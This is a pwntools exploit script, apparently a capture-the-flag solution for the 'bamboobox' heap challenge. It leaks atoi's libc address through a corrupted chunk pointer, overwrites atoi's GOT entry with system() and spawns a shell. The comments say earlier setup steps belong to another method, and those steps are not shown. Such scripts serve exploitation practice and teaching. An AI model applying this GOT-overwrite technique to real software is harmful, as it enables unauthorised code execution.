# -*- coding:utf-8 -*-
from pwn import *
context(os="linux", arch="amd64",log_level = "debug")

ip =""
if ip:
    p = remote(ip,20004)
else:
    p = process("./bamboobox", aslr=0)

elf = ELF("./bamboobox")

def sl(s):
    p.sendline(s)
def sd(s):
    p.send(s)
def rc(timeout=0):
    if timeout == 0:
        return p.recv()
    else:
        return p.recv(timeout=timeout)
def ru(s, timeout=0):
    if timeout == 0:
        return p.recvuntil(s)
    else:
        return p.recvuntil(s, timeout=timeout)
def getshell():
    p.interactive()


def show():
    ru("Your choice:")
    sd("1")
def add(index,content):
    ru("Your choice:")
    sd("2")
    ru("Please enter the length of item name:")
    sd(str(index))
    ru("Please enter the name of item:")
    sd(content)
def change(index,length,content):
    ru("Your choice:")
    sd("3")
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(length))
    ru("Please enter the new name of the item:")
    sd(content)

def delete(index):
    ru("Your choice:")
    sd("4")
    ru("Please enter the index of item:")
    sd(str(index))
def chunk(i):
    return 0x6020c8+i*0x10

magic = 0x400d49
atoi_got = elf.got["atoi"]
#--------------------------------------------------------------------
#方法三
#前面的内容和方法二一样，paylode2后就不一样
payload2 = p64(0)+p64(0)+p64(0x80)+p64(atoi_got)
#ps：是真的迷，如果用这种方法，改chunk0为atoi的got表就可以成功
change(0,0x20,payload2)
show()
ru("0 : ")
atoi = u64(ru("2 : ")[:6].ljust(8,"\x00"))
print "atoi----->"+hex(atoi)

#通过atoi的真实地址，去libc查找可以得到以下：
offset_system = 0x0000000000045390
offset_atoi = 0x0000000000036e80
libc_base = atoi-offset_atoi
system = libc_base+offset_system

change(0,0x8,p64(system))
sl("/bin/sh\x00")
sl("5")

getshell()
